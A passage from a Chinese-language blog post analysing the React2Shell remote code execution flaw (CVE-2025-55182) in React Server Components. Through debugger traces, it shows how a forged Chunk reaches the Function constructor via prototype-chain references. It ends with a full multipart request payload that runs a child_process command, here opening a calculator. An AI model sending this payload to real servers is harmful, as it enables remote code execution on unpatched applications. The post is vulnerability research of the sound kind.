</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=c1>// _chunks[1]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=err>status:</span> <span class=nt>&#34;resolved_model&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=err>value:</span> <span class=nt>&#34;\&#34;$@abc\&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=err>reason:</span> <span class=err>1,</span>
</span></span><span class=line><span class=cl>  <span class=err>_response:</span> <span class=err>{</span>
</span></span><span class=line><span class=cl>    <span class=err>_bundlerConfig:</span> <span class=err>undefined,</span>
</span></span><span class=line><span class=cl>    <span class=err>_prefix:</span> <span class=nt>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=err>_formData:</span> <span class=err>{</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=err>,</span>
</span></span><span class=line><span class=cl>    <span class=err>_chunks:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=err>,</span>
</span></span><span class=line><span class=cl>    <span class=err>_closed:</span> <span class=kc>false</span><span class=err>,</span>
</span></span><span class=line><span class=cl>    <span class=err>_closedReason:</span> <span class=kc>null</span><span class=err>,</span>
</span></span><span class=line><span class=cl>    <span class=err>_temporaryReferences:</span> <span class=err>undefined,</span>
</span></span><span class=line><span class=cl>  <span class=err>},</span>
</span></span><span class=line><span class=cl><span class=err>}</span>
</span></span></code></pre></td></tr></table></div></div><p>回到 <code>getOutlinedModel()</code>，紧接着 又进入<code>initializeModelChunk()</code></p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_5.png width=1003 height=311 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_5_hu_411f90c0d020065b.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_5_hu_5adfd379767525da.png 1024w" loading=lazy class=gallery-image data-flex-grow=322 data-flex-basis=774px></p><p><strong>initializeModelChunk()</strong></p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_3.png width=947 height=471 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_3_hu_d230de5fd0b92c4.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_3_hu_247f407995f8938c.png 1024w" loading=lazy class=gallery-image data-flex-grow=201 data-flex-basis=482px></p><p>同样的，<code>_chunks[1]</code> 的 <code>status</code> 属性修改为“cyclic”，<code>chunk.reason</code>和<code>chunk.value</code>都修改为 <code>null</code>。而后，response、原 <code>chunk.value</code>进行 JSON 反序列化获得的对象（字符串"$@abc"） 、<code>chunk.reason</code>的字符串值传入 <code>reviveModel()</code>函数。</p><p>因为上述 value 是个字符串，所以进入第一个分支——<code>parseModelString()</code>函数：</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_1_1_1.png width=1023 height=233 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_1_1_1_hu_90f8e40229496eb9.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_1_1_1_hu_cd6b8f1998467826.png 1024w" loading=lazy class=gallery-image data-flex-grow=439 data-flex-basis=1053px></p><p>如上，字符串“abc”按照十六进制解析得到数字2748（没什么用，能解析成数字就可以），作为参数 id传入 getChunk 函数，获得以下 Chunk 对象：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=c1>// _chunks[2748]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=err>status:</span> <span class=nt>&#34;pending&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=err>value:</span> <span class=err>null,</span>
</span></span><span class=line><span class=cl>  <span class=err>reason:</span> <span class=err>null,</span>
</span></span><span class=line><span class=cl>  <span class=err>_response:</span> <span class=err>{</span>
</span></span><span class=line><span class=cl>    <span class=err>_bundlerConfig:</span> <span class=err>undefined,</span>
</span></span><span class=line><span class=cl>    <span class=err>_prefix:</span> <span class=nt>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=err>_formData:</span> <span class=err>{</span> <span class=err>Symbol</span> <span class=err>*</span> <span class=err>2</span> <span class=p>}</span><span class=err>,</span>
</span></span><span class=line><span class=cl>    <span class=err>_chunks:</span> <span class=p>{</span> <span class=err>Chunk</span> <span class=err>*</span> <span class=err>3</span> <span class=p>}</span><span class=err>,</span>
</span></span><span class=line><span class=cl>    <span class=err>_closed:</span> <span class=kc>false</span><span class=err>,</span>
</span></span><span class=line><span class=cl>    <span class=err>_closedReason:</span> <span class=kc>null</span><span class=err>,</span>
</span></span><span class=line><span class=cl>    <span class=err>_temporaryReferences:</span> <span class=err>undefined,</span>
</span></span><span class=line><span class=cl>  <span class=err>},</span>
</span></span><span class=line><span class=cl><span class=err>}</span>
</span></span></code></pre></td></tr></table></div></div><p>回到 <code>initializeModelChunk()</code> ,</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_4.png width=995 height=511 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_4_hu_69b593a170e26818.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_4_hu_c8a7301183e64d2b.png 1024w" loading=lazy class=gallery-image data-flex-grow=194 data-flex-basis=467px></p><p><code>_chunks[1]</code> 的 status 属性被修改为“fulfilled”，value 属性被修改为 <code>_chunks[2748]</code>。</p><p>回到 <code>getOutlinedModel()</code>，</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_2.png width=1009 height=375 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_2_hu_fca6ff5e3c7ff895.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_2_hu_eb57b11ee3ae7fe.png 1024w" loading=lazy class=gallery-image data-flex-grow=269 data-flex-basis=645px></p><p>因为 <code>_chunks[1].status</code> 等于 “fulfilled”，<code>parentObject</code> 被临时赋值为 <code>_chunks[2748]</code>。</p><p>第一次循环，取出 reference 第2个元素<code>'__proto__'</code>作为 key取出 <code>parentObject</code> 对应属性为<code>parentObject</code> 重新赋值。</p><p>第二次循环，取出 reference 第2个元素<code>'then'</code>作为 key取出 <code>parentObject</code> 对应属性并为<code>parentObject</code> 重新赋值。</p><p><code>_chunks[2748]</code> 作为 Chunk 实例，其 <code>__proto__</code>属性及 <code>__proto__.then</code> 自然是如前文所展示：<a class=link href=#34-then%e5%9b%9e%e8%b0%83>Chunk.prototype</a></p><p>循环结束，response 与上述 then 函数作为参数传入 <code>createModel()</code> 函数。</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/createModel.png width=349 height=63 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/createModel_hu_ee3602682d047393.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/createModel_hu_d15249b88cd91f1f.png 1024w" loading=lazy class=gallery-image data-flex-grow=553 data-flex-basis=1329px></p><p><code>createModel()</code> 函数直接返回传入的 model 参数，所以 <code>getOutlinedModel()</code>函数最终返回 Chunk 对象自定义的 then函数，也就是递归调用的 <strong>reviveModel()_1_1</strong> 函数最终返回上述 then 函数。</p><p><strong>reviveModel()_0</strong></p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_0.png width=1075 height=389 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_0_hu_8155194394bdbccc.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_0_hu_4946732d6a3d67aa.png 1024w" loading=lazy class=gallery-image data-flex-grow=276 data-flex-basis=663px></p><p>回到表层<code>reviveModel()</code>函数，parentObj 接收上述 then 函数作为新值并赋值给 <code>value</code> 的 then 属性。<code>value</code> 由请求表单中第1个参数值 JSON 反序列化得到。</p><p>继续 for 循环遍历 <code>value</code> 的各属性：</p><ul><li>“status” 属性的值“resolved_model”是字符串，且没有以“$”开头，所以其被原封不动返回</li><li>“reason” 属性值为数值型 -1，直接返回</li><li>“value” 属性同上</li><li>“_response” 属性是一个非 Array 类型对象，跟进递归调用的 <code>reviveModel()</code> 函数</li></ul><p><strong>reviveModel()_1_5</strong></p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_1_5.png width=1079 height=413 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_1_5_hu_d769a2600eeaad06.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_1_5_hu_c6c28cc9551ecc0f.png 1024w" loading=lazy class=gallery-image data-flex-grow=261 data-flex-basis=627px></p><p>与表层reviveModel相同，<code>value</code> 是一个 Object 对象，所以再次进入递归调用：</p><ul><li>_prefix 属性：值为字符串，且没有以“$”开头，返回原值</li><li>_formData 属性：值为非 Array 类型的对象，再次进入 <code>reviveModel()</code> 函数递归调用</li></ul><p><strong>reviveModel()_2_2</strong></p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_2_2.png width=1065 height=413 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_2_2_hu_740e289b680eb718.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_2_2_hu_65f955693495631e.png 1024w" loading=lazy class=gallery-image data-flex-grow=257 data-flex-basis=618px></p><p><code>0:_response:_formData:get</code> 值为字符串 <code>"$1:constructor:constructor"</code>，所以同上将会：<code>reviveModel()</code> => <code>parseModelString()</code> => <code>getOutlinedModel()</code>，跟进 <code>getOutlinedModel()</code>。</p><p><strong>getOutlinedModel()</strong></p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_3.png width=1051 height=335 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_3_hu_81b8493430eb73cd.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_3_hu_91cb3e8d92f3f23c.png 1024w" loading=lazy class=gallery-image data-flex-grow=313 data-flex-basis=752px></p><p>字符串 <code>"$1:constructor:constructor"</code>被分割为包含三个元素的数组，id 被赋值为数字<code>1</code>，进入<code>getChunk()</code>:</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_4.png width=1055 height=309 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_4_hu_af6eb0cf1130353c.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getChunk_4_hu_26fcccbacb29e122.png 1024w" loading=lazy class=gallery-image data-flex-grow=341 data-flex-basis=819px></p><p>与前两次不同，这次使用传入的 id 作为 key可以取出 <code>_chunks[1]</code>，所以<code>_chunks[1]</code>被直接返回。</p><p>回到 <code>getOutlinedModel()</code>，</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_4.png width=1043 height=357 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_4_hu_78bc246c9968fd50.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/getOutlinedModel_4_hu_4b8ee240b108789a.png 1024w" loading=lazy class=gallery-image data-flex-grow=292 data-flex-basis=701px></p><p>因为 <code>_chunks[1].status</code> 已经是 “fulfilled”，所以不再进入“resolved_model”分支，直接进入“fulfilled”分支，<code>parentObject</code> 被赋值为<code>_chunks[1].value</code>， 也就是 <code>_chunks[2748]</code>。</p><p>第一次循环，取出 reference 第2个元素<code>'constructor'</code>作为 key取出 <code>_chunks[2748].constructor</code> ，值为：<code>[Function: Promise]</code></p><p>第二次循环，取出 reference 第2个元素<code>'constructor'</code>作为 key取出<code>[Function: Promise].constructor</code> ，值为：<code>[Function: Function]</code>。</p><p>循环结束，<code>getOutlinedModel()</code>函数结束，递归调用的 <strong>reviveModel()_2_2</strong> 函数最终返回<code>[Function: Function]</code>。</p><p><strong>reviveModel()_1_5</strong></p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_1_5_2.png width=1069 height=439 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_1_5_2_hu_625d4fa4851e889e.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_1_5_2_hu_cfc7eb8b102a3e7a.png 1024w" loading=lazy class=gallery-image data-flex-grow=243 data-flex-basis=584px></p><p>回到 <code>reviveModel()_1_5</code>，<code>0:_response:_formData:get</code>的值被更新为<code>[Function: Function]</code>。</p><p>回到表层<code>reviveModel()</code>，<code>value</code> 元素遍历结束， <code>value</code> 此时值如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=err>then:</span> <span class=err>function</span> <span class=err>(resolve,</span> <span class=err>reject)</span> <span class=err>{</span>
</span></span><span class=line><span class=cl>    <span class=err>switch</span> <span class=err>(this.status)</span> <span class=err>{</span>
</span></span><span class=line><span class=cl>      <span class=err>case</span> <span class=nt>&#34;resolved_model&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=err>initializeModelChunk(this);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=err>switch</span> <span class=err>(this.status)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=err>case</span> <span class=nt>&#34;fulfilled&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=err>resolve(this.value);</span>
</span></span><span class=line><span class=cl>        <span class=err>break;</span>
</span></span><span class=line><span class=cl>      <span class=err>case</span> <span class=s2>&#34;pending&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=err>case</span> <span class=s2>&#34;blocked&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=err>case</span> <span class=s2>&#34;cyclic&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=err>resolve</span> <span class=err>&amp;&amp;</span>
</span></span><span class=line><span class=cl>          <span class=err>(</span><span class=kc>null</span> <span class=err>===</span> <span class=err>this.value</span> <span class=err>&amp;&amp;</span> <span class=err>(this.value</span> <span class=err>=</span> <span class=p>[]</span><span class=err>)</span><span class=p>,</span>
</span></span><span class=line><span class=cl>          <span class=err>this.value.push(resolve));</span>
</span></span><span class=line><span class=cl>        <span class=err>reject</span> <span class=err>&amp;&amp;</span>
</span></span><span class=line><span class=cl>          <span class=err>(null</span> <span class=err>===</span> <span class=err>this.reason</span> <span class=err>&amp;&amp;</span> <span class=err>(this.reason</span> <span class=err>=</span> <span class=err>[]),</span>
</span></span><span class=line><span class=cl>          <span class=err>this.reason.push(reject));</span>
</span></span><span class=line><span class=cl>        <span class=err>break;</span>
</span></span><span class=line><span class=cl>      <span class=err>default:</span>
</span></span><span class=line><span class=cl>        <span class=err>reject(this.reason);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=err>},</span>
</span></span><span class=line><span class=cl>  <span class=err>status:</span> <span class=s2>&#34;resolved_model&#34;</span><span class=err>,</span>
</span></span><span class=line><span class=cl>  <span class=err>reason:</span> <span class=mi>0</span><span class=err>,</span>
</span></span><span class=line><span class=cl>  <span class=err>value:</span> <span class=s2>&#34;{\&#34;then\&#34;:\&#34;$B\&#34;}&#34;</span><span class=err>,</span>
</span></span><span class=line><span class=cl>  <span class=err>_response:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=err>_prefix:</span> <span class=nt>&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;open -a Calculator&#39;);&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=err>_formData:</span> <span class=err>{</span>
</span></span><span class=line><span class=cl>      <span class=err>get:</span> <span class=err>function</span> <span class=err>Function()</span> <span class=err>{</span> <span class=err>[native</span> <span class=err>code]</span> <span class=p>}</span><span class=err>,</span>
</span></span><span class=line><span class=cl>    <span class=err>},</span>
</span></span><span class=line><span class=cl>  <span class=err>},</span>
</span></span><span class=line><span class=cl><span class=err>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到，当前 <code>value</code> 除了确实不是一个 Chunk 实例之外，基本跟一个 Chunk 实例没什么区别。</p><p>回到梦开始的地方：</p><p><strong>initializeModelChunk()</strong></p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_5.png width=1051 height=495 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_5_hu_2a09a99f6e173acc.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_5_hu_628b5c9788565660.png 1024w" loading=lazy class=gallery-image data-flex-grow=212 data-flex-basis=509px></p><p><code>_chunks[0]</code> 的 status 属性被修改为“fulfilled”，value 属性被修改为上述 <code>value</code> 值。</p><p><code>initializeModelChunk()</code>函数结束，回到回调的 <code>then()</code> 函数：</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/then.png width=967 height=218 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/then_hu_d449932b769e388f.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/then_hu_8706cb34e2d808f7.png 1024w" loading=lazy class=gallery-image data-flex-grow=443 data-flex-basis=1064px></p><p><code>_chunks[0].status</code> 等于“fulfilled”，上述 <code>value</code> 被 <code>resolve</code>。于是进入 <code>value.then()</code>。</p><h3 id=35-valuethen回调>3.5 value.then回调</h3><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/value_then.png width=897 height=223 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/value_then_hu_3edc9b40d82a3ac.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/value_then_hu_c7cc4bcc2564f0b7.png 1024w" loading=lazy class=gallery-image data-flex-grow=402 data-flex-basis=965px></p><p>进入<strong>initializeModelChunk()</strong></p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_6.png width=981 height=439 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_6_hu_9413ffda4c11f200.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_6_hu_3acf3bc9f0593844.png 1024w" loading=lazy class=gallery-image data-flex-grow=223 data-flex-basis=536px></p><p><code>value</code> 的 <code>status</code> 属性修改为“cyclic”，<code>value.reason</code>和<code>value.value</code>都修改为 <code>null</code>。而后，<code>value._response</code>、原 <code>value.value</code>进行 JSON 反序列化获得的对象 、<code>chunk.reason</code>的字符串值传入 <code>reviveModel()</code>函数。</p><p>跟前文一样，因为<code>value.value</code>被反序列化为以下非 Array 类型对象，所以<code>reviveModel()</code>函数将会递归调用，遍历该对象的每个属性。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=err>then:</span> <span class=nt>&#34;$B&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>跳过重复部分，跟进递归调用：</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_v_1.png width=1051 height=245 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_v_1_hu_506476bd0adf03f6.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_v_1_hu_c7f51f49a2e306f4.png 1024w" loading=lazy class=gallery-image data-flex-grow=428 data-flex-basis=1029px></p><p>因为当前 value 值<code>$B</code>是字符串，所以进入 <code>parseModelString()</code>函数：</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_v.png width=1087 height=311 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_v_hu_1eee1312f4044329.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/parseModelString_v_hu_873c222ebef9e5.png 1024w" loading=lazy class=gallery-image data-flex-grow=349 data-flex-basis=838px></p><p><code>case "B"</code> ，返回 <code>response._formData.get(response._prefix + obj)</code>。前面已知：</p><ul><li><code>value._response._formData.get</code> 值为 <code>[Function: Function]</code>，是所有函数的构造函数。</li><li><code>value._response._prefix</code> 值为原始传入的恶意 payload</li></ul><p>所以 <code>parseModelString()</code>函数将返回一个<strong>函数体为上述指定恶意代码的匿名函数</strong>。</p><p>回到reviveMode()` 函数，</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_v.png width=1077 height=395 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_v_hu_9f596dd0c169b0cb.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/reviveModel_v_hu_d8e572599235deaf.png 1024w" loading=lazy class=gallery-image data-flex-grow=272 data-flex-basis=654px></p><p>上述对象的<code> then</code> 属性值从 <code>"$B"</code> 被替换为上述匿名函数。</p><p>回到 <code>initializeModelChunk()</code> 函数，</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_7.png width=1031 height=477 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_7_hu_f44f50eaacbc63d9.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/initializeModelChunk_7_hu_68ded0f860263ca9.png 1024w" loading=lazy class=gallery-image data-flex-grow=216 data-flex-basis=518px></p><p><code>value.status</code> 修改为 “fulfilled”，<code>value.value</code> 修改为以下对象：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=err>then:</span> <span class=err>function</span> <span class=err>anonymous()</span> <span class=err>{</span>
</span></span><span class=line><span class=cl>    <span class=err>process.mainModule.require(&#39;child_process&#39;).execSync(&#39;open</span> <span class=err>-a</span> <span class=err>Calculator&#39;);NaN</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span><span class=err>,</span>
</span></span><span class=line><span class=cl><span class=err>}</span>
</span></span></code></pre></td></tr></table></div></div><p>回到 <code>value.then()</code>，</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/value_then_2.png width=879 height=265 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/value_then_2_hu_64ee902bb73bbb67.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/value_then_2_hu_a614abf52d23ccd3.png 1024w" loading=lazy class=gallery-image data-flex-grow=331 data-flex-basis=796px></p><p><code>value.status</code> 已经被修改为“fulfilled”，于是 <code>resolve(value.value)</code>，也就是调用<code>value.value.then()</code>，于是上述包含恶意代码的匿名函数被执行。</p><p><img src=/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/VM.png width=855 height=143 srcset="/p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/VM_hu_2de9c10d31ead107.png 480w, /p/react2shell_cve-2025-55182%E5%88%86%E6%9E%90/VM_hu_a960cdbf9c93d44b.png 1024w" loading=lazy class=gallery-image data-flex-grow=597 data-flex-basis=1434px></p><h2 id=0x04-利用链梳理>0x04 利用链梳理</h2><h3 id=41-构造假-chunk>4.1 构造假 Chunk</h3><ol><li><p>首先是构造 multipart/form-data 请求</p></li><li><p>构造请求数据</p></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=err>Content-Disposition:</span> <span class=err>form-data;</span> <span class=err>name=</span><span class=s2>&#34;0&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>// 每个请求字段都会被尝试解析成一个 Chunk
</span></span></span><span class=line><span class=cl><span class=c1>// 以下 JSON 对象属性对应 Chunk 对象的各项属性
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;then&#34;</span><span class=p>:</span> <span class=s2>&#34;$1:__proto__:then&#34;</span><span class=p>,</span> 	<span class=c1>// 原型链遍历，获取 Chunk.__proto__:then
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nt>&#34;status&#34;</span><span class=p>:</span> <span class=s2>&#34;resolved_model&#34;</span><span class=p>,</span>		<span class=c1>// 伪造状态
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nt>&#34;reason&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;{\&#34;then\&#34;:\&#34;$B\&#34;}&#34;</span><span class=p>,</span>	<span class=c1>// 调用 _formData.get
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nt>&#34;_response&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nt>&#34;_prefix&#34;</span><span class=p>:</span> <span class=s2>&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;open -a Calculator&#39;);throw new Error(&#39;halt&#39;);//&#34;</span><span class=p>,</span> <span class=c1>// 恶意代码
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nt>&#34;_formData&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nt>&#34;get&#34;</span><span class=p>:</span> <span class=s2>&#34;$1:constructor:constructor&#34;</span> <span class=c1>// 获取 [Function: Function]；覆盖FormData.get()方法调用
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=err>Content-Disposition:</span> <span class=err>form-data;</span> <span class=err>name=</span><span class=s2>&#34;1&#34;</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;$@abc&#34;</span>	<span class=c1>// case &#34;@&#34;: Chunk 引用，获取或创建一个 Chunk 对象
</span></span></span></code></pre></td></tr></table></div></div><h3 id=42-原型链遍历>4.2 原型链遍历</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
